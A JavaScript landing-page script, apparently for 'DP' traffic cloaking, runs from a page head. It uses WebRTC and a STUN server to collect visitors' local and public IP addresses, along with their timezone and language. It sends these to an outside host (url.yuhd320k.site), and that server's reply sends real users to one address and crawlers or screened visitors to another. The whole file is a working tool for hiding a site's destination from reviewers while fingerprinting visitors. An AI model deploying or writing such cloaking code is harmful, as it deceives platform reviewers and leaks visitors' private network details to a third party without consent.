/* DP配置 守卫脚本（静态，接入落地页 <head>）
 * 接入：<script src="https://url.yuhd320k.site/js/dp-ck.js"></script>
 * 落地即判定：符合规则(真实用户)跳「实际地址」；命中规则(爬虫/被屏蔽)跳「不符合规则地址」。 */
(function () {
  try {
    var cs = document.currentScript;
    var API_BASE = 'https://url.yuhd320k.site';
    if (cs && cs.src) { var k = cs.src.indexOf('/', 8); if (k > 0) API_BASE = cs.src.slice(0, k); }
    var SITE = location.origin + location.pathname; // 不含查询参数，便于精确定位落地页

    var DEBUG = false;
    try {
      if (cs && cs.src && cs.src.indexOf('debug=1') !== -1) DEBUG = true;
      if (location.search.indexOf('dp_debug=1') !== -1) DEBUG = true;
    } catch (e) {}
    function dbg(m) { try { console.log('[dp-ck]', m); } catch (e) {} }

    var tzOffset = -new Date().getTimezoneOffset() / 60; // 东正，中国 = +8
    var tzIANA = '';
    try { tzIANA = Intl.DateTimeFormat().resolvedOptions().timeZone || ''; } catch (e) {}
    var lang = (navigator.language || navigator.userLanguage || '');

    // WebRTC 采集本机网卡 IP（辅助检测 VPN/代理泄露，仿 km37acd.top/ip）。
    // 用 Google STUN 同时拿到 host（本机）与 srflx（出口公网 IP）候选，供服务端比对；
    // gather 完成即返回，最迟 2.5s 超时兜底，超时/不支持则跳过（不误伤）。
    function collectWebRtcIps(cb) {
      var ips = [];
      var done = false;
      var pc = null;
      function finish() {
        if (done) return; done = true;
        try { if (pc) { pc.onicecandidate = null; try { pc.close(); } catch (e2) {} } } catch (e) {}
        cb(ips);
      }
      try {
        var RTCPC = window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
        if (!RTCPC) { finish(); return; }
        pc = new RTCPC({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
        pc.onicecandidate = function (e) {
          if (!e || !e.candidate) { finish(); return; } // 候选结束（event.candidate 为 null）
          var c = e.candidate.candidate || '';
          var v4 = c.match(/\d{1,3}(?:\.\d{1,3}){3}/g) || [];
          var v6 = c.match(/[0-9a-fA-F]{1,4}(?::[0-9a-fA-F]{1,4}){2,7}/g) || [];
          v4.concat(v6).forEach(function (ip) { if (ips.indexOf(ip) === -1) ips.push(ip); });
        };
        pc.onicegatheringstatechange = function () { if (pc && pc.iceGatheringState === 'complete') finish(); };
        pc.createDataChannel('');
        pc.createOffer(function (offer) { try { pc.setLocalDescription(offer, function () {}, function () {}); } catch (e3) {} }, function () {});
      } catch (e) { finish(); }
      setTimeout(finish, 2500);
    }

    function doCheck(webrtcIps) {
      fetch(API_BASE + '/api/dp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ site: SITE, client: { timezoneOffset: tzOffset, timezoneIANA: tzIANA, lang: lang, webrtcIps: webrtcIps } })
      })
        .then(function (r) { return r.json(); })
        .then(function (d) {
          if (d && d.redirect) {
            dbg('跳转 → ' + d.redirect);
            try { location.replace(d.redirect); } catch (err) { location.href = d.redirect; }
          } else {
            dbg('不跳转。当前落地页: ' + SITE);
            if (d && d.disabled) dbg('  ✗ 原因：未找到匹配的 DP 配置，请在「DP规则设置」里把落地页地址填成 ' + SITE + ' 并保存');
            else if (d && d.enabled === 0) dbg('  ✗ 原因：配置已保存，但「启用 DP 分流」开关未打开，请勾选后重新保存');
            else if (d && d.triggered && d.triggered.length) dbg('  ✓ 命中规则 [' + d.triggered.join(',') + ']，但「不符合规则地址」为空，未跳转');
            else dbg('  ✗ 原因：判定通过（符合规则），但「实际地址」为空');
            if (d) dbg('  服务端返回: ' + JSON.stringify(d));
          }
        })
        .catch(function (e) { dbg('网络异常，不跳转: ' + (e && e.message ? e.message : e)); });
    }

    dbg('DP配置脚本已加载 ✓ 站点: ' + SITE);
    collectWebRtcIps(doCheck);
  } catch (e) {}
})();
